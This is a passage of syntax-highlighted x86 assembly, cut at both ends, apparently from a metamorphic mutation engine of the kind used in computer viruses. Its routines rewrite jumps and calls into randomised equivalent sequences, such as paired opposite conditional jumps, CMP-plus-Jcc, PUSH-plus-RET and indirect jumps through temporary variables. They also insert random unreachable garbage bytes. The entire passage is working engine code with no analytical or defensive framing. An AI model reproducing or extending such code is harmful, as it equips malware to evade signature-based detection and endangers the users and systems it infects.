                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenCALLMem</span><span class="sc0">   </span><span class="sc1">; Make CALL [TempVar]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Multiple_Reg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
   </span><span class="sc5">@@Multiple_Reg_Again</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Multiple_Reg_Again</span><span class="sc0">   </span><span class="sc1">; Get EAX, ECX or EDX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegMem</span><span class="sc0">       </span><span class="sc1">; Make MOV EAX/ECX/EDX,[Mem]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenCALLReg</span><span class="sc0">        </span><span class="sc1">; Make CALL EAX/ECX/EDX</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">        </span><span class="sc1">; Code the CALL [Mem] directly</span><span class="sc0">
</span><span class="sc5">Xp_GenCALLMem_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
</span><span class="sc5">Xp_GenCALLMem</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Generate a JMP Reg</span><span class="sc0">
</span><span class="sc5">Xp_GenJMPReg</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">; Make it complex with a prob. of 1/4</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_1</span><span class="sc0">
   </span><span class="sc5">@@Double_0</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">         </span><span class="sc1">; Allocate a temporary variable</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">        </span><span class="sc1">; Make a MOV [TempVar],Reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenJMPMem</span><span class="sc0">          </span><span class="sc1">; Make a JMP [TempVar]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_RestoreOperation</span><span class="sc0">   </span><span class="sc1">; Generate some not-reachable</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_EndJmp</span><span class="sc0">             </span><span class="sc1">; garbage</span><span class="sc0">
   </span><span class="sc5">@@Double_1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHReg</span><span class="sc0">         </span><span class="sc1">; Make PUSH Reg + RET</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenRET</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_EndJmp</span><span class="sc0">

   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDh</span><span class="sc0">             </span><span class="sc1">; Make the JMP Reg directly</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_EndJmp</span><span class="sc0">             </span><span class="sc1">; Make some garbage</span><span class="sc0">
</span><span class="sc5">Xp_GenJMPReg</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Generate a JMP [Mem]</span><span class="sc0">
</span><span class="sc5">Xp_GenJMPMem</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHMem</span><span class="sc0">      </span><span class="sc1">; Make PUSH Mem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPMem</span><span class="sc0">       </span><span class="sc1">; Make POP Mem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenJMPMem</span><span class="sc0">       </span><span class="sc1">; Make JMP Mem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_RestoreOperation</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_EndJmp</span><span class="sc0">          </span><span class="sc1">; Generate some garbage</span><span class="sc0">

   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">        </span><span class="sc1">; Code the JMP Mem directly</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_EndJmp</span><span class="sc0">
</span><span class="sc5">Xp_GenJMPMem</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function generates a JMP @xxx or a group of instructions that make</span><span class="sc0">
</span><span class="sc1">;; the same, like CMP Reg,Reg/JZ @xxx. </span><span class="sc0">
</span><span class="sc5">Xp_GenJMP</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">  </span><span class="sc1">; Increase the recurse level and make the JMP</span><span class="sc0">
                                </span><span class="sc1">; directly if we are too deep in recursivity</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">   </span><span class="sc1">; Check if we are making the last instrc.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single</span><span class="sc0">     </span><span class="sc1">; If so, code it directly</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">     </span><span class="sc1">; Make a complex JMP with a prob. of 1/8</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
   </span><span class="sc5">@@Double_Other</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">     </span><span class="sc1">; Now select the type of complext JMP we</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">     </span><span class="sc1">; are going to make.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Other</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; Make Jcc(even) + Jcc(odd) or vicev.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_JccJcc</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; Make CMP + Jcc</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_CMPJcc</span><span class="sc0">
                                       </span><span class="sc1">; Let's do Jcc + Jcc (2nd version)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">76h</span><span class="sc0">
   </span><span class="sc5">@@Double_JccJcc2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Make a random selection of two</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_JccJcc2_Next</span><span class="sc0"> </span><span class="sc1">; types of conditional jumps from</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">            </span><span class="sc1">; the set JAE, JBE, JNZ: any</span><span class="sc0">
   </span><span class="sc5">@@Double_JccJcc2_Next</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; combination of two of these</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">       </span><span class="sc1">; types one after another will</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; perform an unconditional JMP.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_JccJcc2_Next02</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; Exchange them randomly</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">@@Double_JccJcc2_Next02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; Set the first Jcc (EDX)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenJcc_SingleJcc</span><span class="sc0"> </span><span class="sc1">; Make a direct Jcc</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; Set the second Jcc (ECX)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenJcc_SingleJcc</span><span class="sc0"> </span><span class="sc1">; Make the direct Jcc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_RestoreOperation</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@InsertStopMark</span><span class="sc0">      </span><span class="sc1">; Since there aren't branch-end</span><span class="sc0">
                                  </span><span class="sc1">; instructions (although when executed they</span><span class="sc0">
                                  </span><span class="sc1">; will never pass beyond), we must insert</span><span class="sc0">
                                  </span><span class="sc1">; a branch-end instruction to force the</span><span class="sc0">
                                  </span><span class="sc1">; disassembler to stop the branch of code.</span><span class="sc0">
   </span><span class="sc5">@@Double_CMPJcc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">  </span><span class="sc1">; Let's make a CMP Reg,Reg/Jcc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">@@Double_CMPJcc_x</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">            </span><span class="sc1">; Get a register to compare</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Don't play with ESP!</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_CMPJcc_x</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Set source and destiny</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; register as the same</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Set a size of 32 bits</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegReg</span><span class="sc0">    </span><span class="sc1">; Construct the comparision instrc.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetSpecialJcc</span><span class="sc0">  </span><span class="sc1">; Get a Jcc that is prepared for</span><span class="sc0">
   </span><span class="sc5">@@Double_CMPJcc_Common</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; this type of operation</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Invert the last bit, since the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; returned Jcc is prepared</span><span class="sc0">
                                                 </span><span class="sc1">; to make a NOP operation.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenJcc_SingleJcc</span><span class="sc0">   </span><span class="sc1">; Make the Jcc as a single ins.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_RestoreOperation</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@InsertStopMark</span><span class="sc0">    </span><span class="sc1">; Set a stop mark.</span><span class="sc0">
   </span><span class="sc5">@@Double_JccJcc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0"> </span><span class="sc1">; Other type of a pair of Jccs that</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">           </span><span class="sc1">; always jump: any conditional jump</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">         </span><span class="sc1">; with even opcode has its opposite</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">         </span><span class="sc1">; in the same opcode but setting last</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; bit to 1. So, we select a</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; random conditional jump, we</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenJcc_SingleJcc</span><span class="sc0"> </span><span class="sc1">; insert it, and after that we</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; insert the same Jcc but with the</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_CMPJcc_Common</span><span class="sc0"> </span><span class="sc1">; bit 0 inversed. Example:</span><span class="sc0">
                                             </span><span class="sc1">; JZ @xxx + JNZ @xxx</span><span class="sc0">
                                             </span><span class="sc1">; JB @xxx + JAE @xxx</span><span class="sc0">
   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">        </span><span class="sc1">; The jump directly.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">Xp_EndJmp</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">         </span><span class="sc1">; Now make garbage bytes with a prob.</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">; of 1/4</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">         </span><span class="sc1">; Make a quantity of bytes from 1 to 8</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc5">@@LoopInsert</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">        </span><span class="sc1">; Get a random byte</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FDh</span><span class="sc0">      </span><span class="sc1">; Set FD pseudoopcode (it means "insert</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; this byte directly into the code").</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
